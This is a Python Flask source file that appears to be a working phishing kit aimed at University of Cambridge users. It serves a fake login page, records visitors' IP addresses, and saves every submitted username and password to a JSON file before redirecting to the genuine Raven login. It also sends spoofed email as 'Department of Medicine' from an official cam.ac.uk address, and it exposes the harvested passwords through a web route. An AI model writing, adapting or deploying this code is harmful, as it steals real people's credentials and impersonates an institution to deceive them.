import os
import json
import time

from flask import Flask, render_template, url_for, request, redirect, jsonify
from flask_mail import Mail
from flask_mail import Message

app = Flask(__name__)
app.config["JSONIFY_PRETTYPRINT_REGULAR"] = True

# mail = Mail(app)
# app.config["MAIL_SERVER"] = ''
# app.config["MAIL_PORT"] = 
# app.config["MAIL_USERNAME"] = ''
# app.config["MAIL_PASSWORD"] = ''

mail = Mail(app)

credentials_json_file_path = os.path.abspath(os.path.dirname(__file__)) + '/credentials.json'
visitors_json_file_path = os.path.abspath(os.path.dirname(__file__)) + '/visitors.json'

def load_file(path):
    data = []
    with open(path) as file:
        data = json.load(file)
    return(data)

def write_file(path, data):
    with open(path, 'w') as outfile:
        json.dump(data, outfile)

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == 'GET':
        # log visitor
        visitors = load_file(visitors_json_file_path)
        current_time = time.strftime('%A %B, %d %Y %H:%M:%S')
        remote_address = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)
        # update time for visitor if needed
        already_in_db = False
        for visitor in visitors:
            if visitor["remote_address"].strip() == remote_address.strip():
                visitor["times_accessed"].append(current_time)
                already_in_db = True
        # add as new visitor
        if not already_in_db:
            visitor = {"remote_address" : remote_address.strip(), "times_accessed" : [current_time]}
            visitors.append(visitor)
        # write file
        write_file(visitors_json_file_path, visitors)
        return render_template("example.html")
    else:
        # log credentials
        username = request.form.get("username")
        password = request.form.get("password")
        new_credentials = {"username" : username, "password": password}
        credentials = load_file(credentials_json_file_path)
        credentials.append(new_credentials)
        write_file(credentials_json_file_path, credentials)
        # redirect to actual website on submit
        return redirect("https://raven.cam.ac.uk/")

@app.route("/send-email")
def send_email():
    # can create a web template with a form to let phishers email any message
    try:
        msg = Message("Important message for you!",
                      sender=("Department of Medicine",
                              "official@cam.ac.uk"),
                      recipients=["john.doe@gmail.com"])
        msg.html = "<b>Hello!</b>"
        mail.send(msg)
    except Exception as e:
        print(e)
    return "Sent"

@app.route("/view-passwords")
def view_passwords():
    credentials = load_file(credentials_json_file_path)
    return jsonify(credentials)

@app.route("/view-visitors")
def view_visitors():
    visitors = load_file(visitors_json_file_path)
    return jsonify(visitors)

if __name__ == '__main__':
   app.run(debug=True)


